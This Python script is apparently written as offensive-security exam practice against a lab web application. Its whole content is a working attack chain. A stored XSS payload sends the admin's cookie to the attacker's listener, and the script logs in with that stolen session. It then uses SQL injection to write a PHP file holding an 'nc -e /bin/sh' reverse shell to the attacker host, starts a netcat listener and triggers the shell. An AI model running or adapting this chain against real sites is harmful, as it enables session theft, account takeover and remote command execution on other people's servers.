#!/usr/bin/python3

## https://github.com/wetw0rk/AWAE-PREP/tree/master/XSS%20and%20MySQL
## Base template for the python server is here: https://gist.githubusercontent.com/mdonkers/63e115cc0c79b4f6b8b3a6b797e485c7/raw/a6a1d090ac8549dac8f2bd607bd64925de997d40/server.py

## Good example for logging: https://docs.python.org/3/howto/logging.html#changing-the-format-of-displayed-messages

#!/usr/bin/env python3
"""
Very simple HTTP server in python for logging requests
Usage::
    ./server.py [<port>]
"""
from http.server import BaseHTTPRequestHandler, HTTPServer
import logging
import requests
import sys
import random
import socket
from time import sleep
import os


# Class S to server as the http server handler to receive the requests with the admin cookie.
class S(BaseHTTPRequestHandler):
    # Keyword _set_response funtion for the handler class that automatically sends the HTTP response back to the client when receiving an HTTP request.
    def _set_response(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()

    # Keyword do_GET function to performs actions when a GET HTTP request is received.
    def do_GET(self):
        # Parse the path we receive that contains the admin cookie to store it in the global var_admin_cookie variable.
        var_path = str(self.path)
        # Note that we need the keyword global so that we can pull the variable value from outside this function.
        global var_admin_cookie
        var_admin_cookie = var_path.split('=')[2]

        # Send the response to the request to complete the HTTP session.
        self._set_response()

# The exploit function that runs.
def exploit(server_class=HTTPServer, handler_class=S, port=8080):
    logging.basicConfig(level=logging.INFO, format='%(asctime)s:%(levelname)s:%(message)s', datefmt='%m/%d/%Y %I:%M:%S %p')

    # 0. Send request to instantiate the stored XSS exploit that sends the admin cookie back to our server.
    logging.info('1. Stored XSS Payload: Sending...')
    sleep(2)
    session = requests.Session()

    # Send an HTTP POST request an existing comment with the stored XSS payload to send the cookie of any user navigating to this page back to our server.
    response = requests.post('http://192.168.0.228/post_comment.php?id=1',data={
        'text':'<script>(new Image()).src = "http://192.168.0.102:'+str(port)+'/?cookie=" + document.cookie;</script>',
        'submit':'Submit',
    })

    if int(response.status_code) == 200:
        logging.info("1. Stored XSS Payload: Success!\n")
        sleep(2)
    else:
        sys.exit("1. Stored XSS Payload: Didn't work...Exiting")




    # 1. Runs the HTTP server to handle the HTTP request we receive.
    ## Runs until we receive 1 HTTP request and then it stops.
    ## We run the server to extract the PHP session ID of the admin.
    server_address = ('', port)
    httpd = server_class(server_address, handler_class)
    logging.info('2. Admin Cookie Capture: Server Waiting on port %s...', port)
    try:
        # Handle_request dies after receiving 1 HTTP request.  server_forever() exists until the user kills the program.
        httpd.handle_request()
    except KeyboardInterrupt:
        pass
    httpd.server_close()
    logging.info('2. Admin Cookie Capture: Received Request - Stopping server.')
    sleep(2)

    # 2. Authenticate into the website as an admin with the admin cookie we pulled from our HTTP server.
    # Establish a session.
    session = requests.Session()
    # Set the cookies to the PHP session ID that we pulled from the HTTP request we received in our server.
    cookies = {
    "PHPSESSID":var_admin_cookie,
    }
    # Send an HTTP request to the admin panel with our admin cookie to make sure it works.
    response = requests.get('http://192.168.0.228/admin',cookies=cookies,verify=False)
    if "Logout" in str(response.content):
        logging.info("2. Admin Cookie Capture: Confirmed we are admin!\n")
        sleep(2)
    else:
        sys.exit("2. Admin Cookie Capture: Didn't work...Exiting :(")

    # 3. Write file to server disk for shell access.
    ## Generate random number to make each request (likely) unique.
    random_number = random.randint(0,100)
    logging.info("3. Reverse Shell: Writing reverse shell payload to server...")
    sleep(2)
    response = requests.get('http://192.168.0.228/admin/edit.php?id=0 union select 1,"<?php exec(\'nc -e /bin/sh 192.168.0.102 9001\')?>",3,4 into outfile "/var/www/css/proof_'+str(random_number)+'.php"', cookies=cookies, verify=False)
    ## Confirm that the file has been written to disk.
    response = requests.get('http://192.168.0.228/css/')
    if "proof_"+str(random_number)+".php" in str(response.content):
        logging.info("3. Reverse Shell: Confirmed reverse shell payload written to server!\n")
        sleep(2)
    else:
        sys.exit("3. Reverse Shell: Didn't work...Exiting :(")

    # 4. Reverse Shell Listener
    logging.info("4. Reverse Shell Command: Opening up a reverse shell listener in another terminal...")
    sleep(2)
    ## Open up a new terminal with the nc reverse shell listener.
    netcat = 'xfce4-terminal -e "nc -lvnp 9001"'
    from subprocess import call
    call(netcat,shell=True)
    sleep(2)

    ## Execute the reverse shell payload to send the reverse shell.
    logging.info("4. Reverse Shell Command: Sending reverse shell!")
    sleep(2)
    response = requests.get('http://192.168.0.228/css/proof_'+str(random_number)+'.php')
    sys.exit("4. Reverse Shell Command: Reverse Shell Closed...Exiting")
    sleep(2)

# Main function that runs when executing the script.
if __name__ == '__main__':
    from sys import argv

    if len(argv) == 2:
        exploit(port=int(argv[1]))
    else:
        exploit()
